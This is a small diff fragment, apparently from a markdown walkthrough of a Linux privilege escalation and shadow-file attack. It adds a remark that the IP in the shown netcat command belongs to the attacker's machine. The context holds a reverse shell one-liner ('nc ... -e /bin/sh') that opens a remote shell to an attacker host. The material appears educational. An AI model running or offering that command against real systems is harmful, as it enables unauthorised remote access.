@@ -13,6 +13,7 @@ Here is where this sort of attack becomes impractical in the real world. We need
 ```
 sudo nc 192.168.2.250 5000 -e /bin/sh
 ```
+Of cource, the above IP address should be the IP address for your attacker machine
 
 # What is a shadow file?
 ## From the man page for shadow
